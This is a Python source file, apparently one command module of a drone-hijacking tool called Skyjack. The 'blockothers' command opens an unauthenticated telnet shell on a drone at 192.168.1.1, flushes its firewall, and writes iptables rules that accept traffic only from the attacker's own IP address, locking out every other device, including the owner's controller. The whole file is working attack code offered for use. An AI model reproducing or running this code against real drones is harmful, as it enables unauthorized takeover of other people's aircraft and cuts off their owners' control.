from lib.parser import SkyjackArgumentParser
import telnetlib
import netifaces as ni
from termcolor import colored

info_str = colored("[*] ", "blue")

class BlockOthersCommand():

    def __init__(self, interface):
        self.cmd = "blockothers"

        self.parser = SkyjackArgumentParser(prog=self.cmd, description="block other users")
        self.interface = interface
        self.parser.add_argument('-d', '--disable', help="disable ip block", action="store_true")

    def execute(self, args):
        "prevents other devices from connecting to the drone\n\t\tundo with blockothers -d / --disable"
        blockothers(self.interface, args.disable)

def blockothers(interface, disable):
    try:
        if_info = ni.ifaddresses(interface)
    except ValueError as e:
        print "Unable to access interface %s" % (interface,)
        return

    # get ip of specified interface
    ip = if_info[2][0]['addr']

    try:
        tn = telnetlib.Telnet('192.168.1.1')
    except IOError as se:
        print "Unable to open telnet connection: %s" % (se,)
        return

    # ip = "192.168.1.5"

    try:
        tn.read_until("commands.\r\n\r\n")
    except EOFError as e:
        print "Can not read from telnet connection: %s" % (str(e),)
        return

    try:
        tn.write("iptables -P INPUT ACCEPT\r\n")
        tn.write("iptables -P OUTPUT ACCEPT\r\n")
        tn.write("iptables -F\r\n")
        if not disable:
            tn.write("iptables -A INPUT -s %s -j ACCEPT\r\n" % (ip,))
            tn.write("iptables -A INPUT -p UDP --dport 67:68 --sport 67:68 -j ACCEPT\r\n")
            tn.write("iptables -A OUTPUT -d %s -j ACCEPT\r\n" % (ip,))
            tn.write("iptables -A OUTPUT -p UDP --dport 67:68 --sport 67:68 -j ACCEPT\r\n")
            tn.write("iptables -P INPUT DROP\r\n")
            tn.write("iptables -P OUTPUT DROP\r\n")
            print info_str + "to unblock execute blockothers -d / --disable"
        tn.write("exit\r\n")
    except IOError as se:
        print "Failed to write to telnet connection: %s" % (str(se),)
        return

    print tn.read_all()
